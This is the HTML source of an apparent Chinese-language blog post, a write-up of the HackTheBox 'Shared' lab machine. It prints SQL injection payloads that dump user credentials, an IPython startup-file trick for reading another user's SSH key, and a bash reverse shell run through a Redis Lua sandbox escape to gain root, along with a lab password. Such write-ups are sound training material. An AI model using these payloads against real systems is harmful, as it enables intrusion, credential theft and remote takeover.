@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Enumerate  port scan 首先用nmap扫描如下： 12345PORT    STATE SERVICE  VERSION22&#x2F;tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80&#x2F;tcp  open  http     nginx 1.18.0443&#x2F;tcp open  ssl&#x2F;http ngin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Shared Machine Challenge">
+<meta property="og:url" content="http://example.com/2022/08/18/htb-shared/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Enumerate  port scan 首先用nmap扫描如下： 12345PORT    STATE SERVICE  VERSION22&#x2F;tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80&#x2F;tcp  open  http     nginx 1.18.0443&#x2F;tcp open  ssl&#x2F;http ngin">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-18T04:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="LDAP">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Shared Machine Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/25/dvwa-section-a/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/13/htb-trick/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/18/htb-shared/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/18/htb-shared/&text=HTB Shared Machine Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/18/htb-shared/&is_video=false&description=HTB Shared Machine Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Shared Machine Challenge&body=Check out this article: http://example.com/2022/08/18/htb-shared/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/18/htb-shared/&name=HTB Shared Machine Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/18/htb-shared/&t=HTB Shared Machine Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#enumerate"><span class="toc-number">1.</span> <span class="toc-text"> Enumerate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">1.1.</span> <span class="toc-text"> port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirctory-enumerate"><span class="toc-number">1.2.</span> <span class="toc-text"> dirctory enumerate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-the-way"><span class="toc-number">2.</span> <span class="toc-text"> Find The way</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">2.1.</span> <span class="toc-text"> SQL injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-authentication"><span class="toc-number">3.</span> <span class="toc-text"> Fake Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-new-user"><span class="toc-number">3.1.</span> <span class="toc-text"> find new user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ipython-exploit"><span class="toc-number">3.2.</span> <span class="toc-text"> ipython exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dan"><span class="toc-number">4.</span> <span class="toc-text"> DAN!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-user-flag"><span class="toc-number">4.1.</span> <span class="toc-text"> get user flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-group-info"><span class="toc-number">4.2.</span> <span class="toc-text"> find group info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#elevated-privilege"><span class="toc-number">5.</span> <span class="toc-text"> Elevated Privilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">6.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Shared Machine Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-18T04:00:00.000Z" itemprop="datePublished">2022-08-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/LDAP/" rel="tag">LDAP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="enumerate"><a class="markdownIt-Anchor" href="#enumerate"></a> Enumerate</h2>
+<h3 id="port-scan"><a class="markdownIt-Anchor" href="#port-scan"></a> port scan</h3>
+<p>首先用nmap扫描如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>然后访问网站，在访问网站前我们现需要在本地设置IP指向为<code>shared.htb</code></p>
+<p>进入网站审视，可以发现这是一个购物网站，但是并没有发现什么明显的可利用漏洞，任意选购物品下单，导向到了<code>check.shared.htb</code>，看来这是遗留的子域名，需要将其添加在IP后面。网站的脚标表明这个网站是用PrestaShop搭建起来的，于是我试图用<code>searchsploit</code>查看是否有相关CMS的漏洞利用，但是很明显的，我需要的是网站安装的版本号</p>
+<h3 id="dirctory-enumerate"><a class="markdownIt-Anchor" href="#dirctory-enumerate"></a> dirctory enumerate</h3>
+<p>第一个可以考虑Google搜索查看是否在网站的某个角落可以查看到系统版本号</p>
+<p>第二个是看是否有安装遗留文件，让我们可以根据相关文件内容查看到版本号信息</p>
+<p>我并没有从第一个方法获得任何版本号信息，于是我开始用<code>gobuster</code>对网站的目录进行爆破，结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//api/                (Status: 401) [Size: 16]</span><br><span class="line">//js/                 (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//modules/            (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//config/             (Status: 403) [Size: 153]        </span><br><span class="line">//api.php             (Status: 401) [Size: 16]         </span><br><span class="line">//themes/             (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//cache/              (Status: 403) [Size: 153]        </span><br><span class="line">//INSTALL.txt         (Status: 200) [Size: 5047]       </span><br><span class="line">//upload/             (Status: 403) [Size: 153]        </span><br><span class="line">//download/           (Status: 302) [Size: 0] [--&gt; ../]</span><br><span class="line">//img/                (Status: 403) [Size: 153]        </span><br><span class="line">//api                 (Status: 401) [Size: 16]         </span><br><span class="line">/robots.txt           (Status: 200) [Size: 2748]       </span><br><span class="line">//upload.php          (Status: 403) [Size: 153]        </span><br><span class="line">//tools/              (Status: 403) [Size: 153]        </span><br><span class="line">//src/                (Status: 403) [Size: 153]        </span><br><span class="line">//pdf/                (Status: 302) [Size: 0] [--&gt; ../]</span><br></pre></td></tr></table></figure>
+<p>访问<code>INSTALL.txt</code>得知版本为<code>PrestaShop 1.7</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PrestaShop 1.6.x/1.7.x - Remote Code Execution                    | php/webapps/45964.php</span><br><span class="line">Prestashop 1.7.6.4 - Cross-Site Request Forgery                   | php/webapps/48347.txt</span><br><span class="line">PrestaShop 1.7.6.7 - &#x27;location&#x27; Blind Sql Injection               | php/webapps/49755.py</span><br><span class="line">Prestashop 1.7.7.0 - &#x27;id_product&#x27; Time Based Blind SQL Injection  | php/webapps/49410.txt</span><br></pre></td></tr></table></figure>
+<p>比较吸引人的是RCE漏洞，但是似乎官方也注意到了不能够让黑客得到后台管理网址，在默认安装后，对<code>/admin</code>进行访问是会重定向到首页的，需要用户手动更改后台地址后才能够正常访问，显然只能用爆破来解决，在刚刚的枚举中并没有发现任何可以目录。</p>
+<h2 id="find-the-way"><a class="markdownIt-Anchor" href="#find-the-way"></a> Find The way</h2>
+<h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL injection</h3>
+<p>在结算页面我发现cookie中有一个特别显眼的键<code>custom_card</code>，内容经过转码后是JSON格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;商品代号&quot;:&quot;数量&quot;&#125;</span><br><span class="line">example:</span><br><span class="line">&#123;&quot;YCS98E4A&quot;:&quot;1&quot;,&quot;BTAPXNX4&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>于是我尝试修改商品代号，奇怪的是显示的不是我自定义修改的名字，而是<code>Not Found</code>，我猜测这里可能是利用了数据的查询，为了验证这一点，我进行了如下修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">尝试：</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1,2 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;abc&#x27; and 1=0 union select 1,2,3 -- -&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;BTAPXNX4&quot;</span>:<span class="string">&quot;10&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>发现第三个的2得到了回显，我们可以在<code>&#123;&quot;abc' and 1=0 union select 1,2,3 -- -&quot;:&quot;1&quot;,&quot;BTAPXNX4&quot;:&quot;10&quot;&#125;</code>把<code>2</code>修改为我们需要进行查询的语句</p>
+<p><strong>查找database</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>结果:|information_schema|,|checkout|</p>
+</blockquote>
+<p><strong>查找table</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,table_name,0x7c) fRoM information_schema.tables),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>结果:|ALL_PLUGINS|,…,|THREAD_POOL_STATS|,|user|,|product|</p>
+</blockquote>
+<blockquote>
+<p>有用的也就最后两个表user和product</p>
+</blockquote>
+<p><strong>获取column</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select gRoUp_cOncaT(0x7c,column_name,0x7c) fRoM information_schema.columns where table_name = &#x27;user&#x27;),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;BTAPXNX4&quot;</span><span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>结果：id|username|password</p>
+</blockquote>
+<p><strong>Finally！Dump Data</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;abc&#x27; and 1=0 union select 1,(select group_concat(concat(`username`,&#x27;|&#x27;,`password`))  from user),3 -- -&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>结果：james_mason|fc895d4eddc2fc12f995e18c865cf273</p>
+</blockquote>
+<p>可以在在线md5解密网站得到明文<code>Soleil101</code></p>
+<h2 id="fake-authentication"><a class="markdownIt-Anchor" href="#fake-authentication"></a> Fake Authentication</h2>
+<h3 id="find-new-user"><a class="markdownIt-Anchor" href="#find-new-user"></a> find new user</h3>
+<p>ssh登陆后发现并没有想象中的顺利，我们在主机上被限制了很多权限，home目录也并没有user flag，但是能够看到有一个<code>dan_smith</code>的用户，user flag在他的家里面。</p>
+<p>权限信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(james_mason) gid=1000(james_mason) <span class="built_in">groups</span>=1000(james_mason),1001(developer)</span><br><span class="line"></span><br><span class="line">uid=1001(dan_smith) gid=1002(dan_smith) <span class="built_in">groups</span>=1002(dan_smith),1001(developer),1003(sysadmin)</span><br></pre></td></tr></table></figure>
+<h3 id="ipython-exploit"><a class="markdownIt-Anchor" href="#ipython-exploit"></a> ipython exploit</h3>
+<p>使用pspy64发现UID=1001在干如下事情</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022/08/18 23:21:01 CMD: UID=1001 PID=34081  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython                                       </span><br><span class="line">2022/08/18 23:21:01 CMD: UID=1001 PID=34083  | /usr/bin/python3 /usr/local/bin/ipython                                                                                    </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34106  | /usr/bin/pkill ipython </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34105  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython                                       </span><br><span class="line">2022/08/18 23:22:01 CMD: UID=1001 PID=34107  | /usr/bin/python3 /usr/local/bin/ipython</span><br></pre></td></tr></table></figure>
+<p>遍历全目录发现developer组有一个文件夹<code>/opt/script_review</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drwxrwx--- 2 root developer 4.0K Jul 14 13:46 .</span><br><span class="line">drwxr-xr-x 3 root root      4.0K Jul 14 13:46 ..</span><br></pre></td></tr></table></figure>
+<p>根据ipython的安全故障描述，确实存在越权执行代码的情况，根据提示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default</span><br><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default/startup</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;python script&#x27;</span> &gt; /tmp/profile_default/startup/foo.py</span><br></pre></td></tr></table></figure>
+<p>这里python script改为读取用户home目录的<code>id_rsa</code>文件即可</p>
+<h2 id="dan"><a class="markdownIt-Anchor" href="#dan"></a> DAN!</h2>
+<h3 id="get-user-flag"><a class="markdownIt-Anchor" href="#get-user-flag"></a> get user flag</h3>
+<p>连接ssh -i标识进行认证后，终于可以拿到user flag</p>
+<h3 id="find-group-info"><a class="markdownIt-Anchor" href="#find-group-info"></a> find group info</h3>
+<p><code>dan_smith</code>用户有一个有趣的用户组sysadmin，光是名字就很有趣了。于是按组查找发现了<code>/usr/local/bin/redis_connector_dev</code>可执行文件，这个文件执行后自动过了redis验证，于是直接nc监听redis端口看看发生了什么</p>
+<h2 id="elevated-privilege"><a class="markdownIt-Anchor" href="#elevated-privilege"></a> Elevated Privilege</h2>
+<p>根据<a target="_blank" rel="noopener" href="https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/">这篇CVE报告</a>,进行如下操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/&#123;your tun ip&#125;/2710&quot; 0&gt;&amp;1&quot; &gt; /dev/shmsh</span><br><span class="line">redis-cli --pass F2WHqJUz2WEz=Gqq</span><br></pre></td></tr></table></figure>
+<p>Redis-cli中执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = l(); local f = io.popen(&quot;cat /dev/shm/sh | bash&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>
+<p>本地Terminal监听2710端口：<br />
+建立连接后输入就可以看到已经是root用户组<br />
+监听视角：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 2710 ...</span><br><span class="line">connect to [10.10.16.17] from (UNKNOWN) [10.10.11.172] 45908</span><br><span class="line">bash: cannot set terminal process group (3180): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@shared:/var/lib/redis# </span><br></pre></td></tr></table></figure>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2>
+<p>参考了GatoGamer大佬的帖子，总体来说没有特别难的地方，在找redis密码的时候犯了难，本来还想用Ghidra逆向一下，没想到直接监听端口端口这么简单，思路上还是不够骚。毕。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#enumerate"><span class="toc-number">1.</span> <span class="toc-text"> Enumerate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">1.1.</span> <span class="toc-text"> port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirctory-enumerate"><span class="toc-number">1.2.</span> <span class="toc-text"> dirctory enumerate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-the-way"><span class="toc-number">2.</span> <span class="toc-text"> Find The way</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">2.1.</span> <span class="toc-text"> SQL injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-authentication"><span class="toc-number">3.</span> <span class="toc-text"> Fake Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-new-user"><span class="toc-number">3.1.</span> <span class="toc-text"> find new user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ipython-exploit"><span class="toc-number">3.2.</span> <span class="toc-text"> ipython exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dan"><span class="toc-number">4.</span> <span class="toc-text"> DAN!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-user-flag"><span class="toc-number">4.1.</span> <span class="toc-text"> get user flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-group-info"><span class="toc-number">4.2.</span> <span class="toc-text"> find group info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#elevated-privilege"><span class="toc-number">5.</span> <span class="toc-text"> Elevated Privilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">6.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/18/htb-shared/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/18/htb-shared/&text=HTB Shared Machine Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/18/htb-shared/&is_video=false&description=HTB Shared Machine Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Shared Machine Challenge&body=Check out this article: http://example.com/2022/08/18/htb-shared/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/18/htb-shared/&title=HTB Shared Machine Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/18/htb-shared/&name=HTB Shared Machine Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/18/htb-shared/&t=HTB Shared Machine Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
